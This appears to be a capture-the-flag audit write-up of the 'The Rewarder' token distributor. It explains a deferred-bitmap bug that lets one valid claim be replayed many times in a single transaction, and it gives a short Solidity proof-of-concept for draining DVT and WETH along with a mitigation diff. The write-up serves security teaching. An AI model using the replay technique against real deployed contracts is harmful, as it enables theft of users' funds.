---
title: The Rewarder Audit Report
author: Jack
date: January 09, 2026
header-includes:
  - \usepackage{titling}
  - \usepackage{graphicx}
---


Prepared by: [Jack](https://github.com/Jack-OuCJ)

# Table of Contents
- [Severity Classification](#severity-classification)
- [Summary](#summary)
- [Findings](#findings)
  - [High](#high)

# Severity Classification

| Severity         | Description |
| ---------------- | ----------- |
| ![high]          | A **directly** exploitable security vulnerability that leads to stolen/lost/locked/compromised assets or catastrophic denial of service. |
| ![medium]        | Assets not at direct risk, but the function of the protocol or its availability could be impacted. |
| ![low]           | A violation of common best practices or incorrect usage of primitives, which may not currently have a major impact on security. |
| ![informational] | Non-critical comments, recommendations or potential optimizations, not relevant to security. |

# Summary

| Severity         | Number of issues found |
| ---------------- | ---------------------- |
| ![high]          | 1                      |
| ![medium]        | 0                      |
| ![low]           | 0                      |
| ![informational] | 0                      |
| Total            | 1                      |

# Findings

## High

### [H-1] Delayed bitmap update in `claimRewards()` allows the same batch to be claimed multiple times within a single transaction

**Description:** `TheRewarderDistributor::claimRewards()` processes a list of `Claim` structs in a loop. It accumulates a `bitsSet` bitmask and total `amount` per token, only writing the "claimed" state to the bitmap when either the token changes or the loop ends. Critically, each iteration always executes a real token `transfer` regardless of whether the bitmap has been updated yet:

```solidity
for (uint256 i = 0; i < inputClaims.length; i++) {
    inputClaim = inputClaims[i];
    ...
    // bitsSet accumulates bit for this batch (OR — no duplicate detection)
    bitsSet = bitsSet | 1 << bitPosition;
    amount += inputClaim.amount;

    // ⚠️ _setClaimed only called at token-switch or final iteration
    if (i == inputClaims.length - 1) {
        if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
    }

    // ⚠️ Transfer happens every iteration — BEFORE the bitmap is written
    inputTokens[inputClaim.tokenIndex].transfer(msg.sender, inputClaim.amount);
}
```

If the same valid `(token, batchNumber)` pair is submitted multiple times in a single call, each repetition:
- Adds the same bit again (no-op to `bitsSet` since the bit is already set via OR)
- Still increases `amount`
- Still executes a real transfer

The final `_setClaimed` call writes the bitmask that reflects only one unique claim per batch, but by that point N transfers have already occurred for N repetitions.

**Impact:** An attacker who holds a valid claim can replay it an arbitrary number of times in a single transaction, draining tokens proportional to the number of repetitions. In the challenge scenario, player claims for both DVT and WETH can be replicated to exhaust effectively all available distribution tokens and transfer them to the recovery address.

**Proof of Concept:**

```solidity
// Build input: repeat the same valid claim N times for each token
Claim[] memory claims = new Claim[](N * 2); // N DVT + N WETH
for (uint256 i = 0; i < N; i++) {
    claims[i] = Claim({batchNumber: 0, amount: DVT_AMOUNT, tokenIndex: 0, proof: dvtProof});
    claims[N + i] = Claim({batchNumber: 0, amount: WETH_AMOUNT, tokenIndex: 1, proof: wethProof});
}
distributor.claimRewards(claims, tokens);
// Result: N * DVT_AMOUNT DVT and N * WETH_AMOUNT WETH transferred to caller
```

**Recommended Mitigation:**

Write the claim bitmap **before** executing any token transfer, not after the full loop. Check the claimed status **per iteration** rather than deferring to loop end:

```diff
for (uint256 i = 0; i < inputClaims.length; i++) {
+   // Write bitmap and verify before any transfer
+   if (!_setClaimed(token, inputClaim.amount, wordPosition, 1 << bitPosition)) revert AlreadyClaimed();
    inputTokens[inputClaim.tokenIndex].transfer(msg.sender, inputClaim.amount);
}
```

This ensures each `(token, batchNumber)` pair is marked claimed atomically before its transfer, preventing replay within and across transactions.

[high]: https://img.shields.io/badge/-High-red "High"
[medium]: https://img.shields.io/badge/-Medium-orange "Medium"
[low]: https://img.shields.io/badge/-Low-yellow "Low"
[informational]: https://img.shields.io/badge/-Informational-blue "Informational"
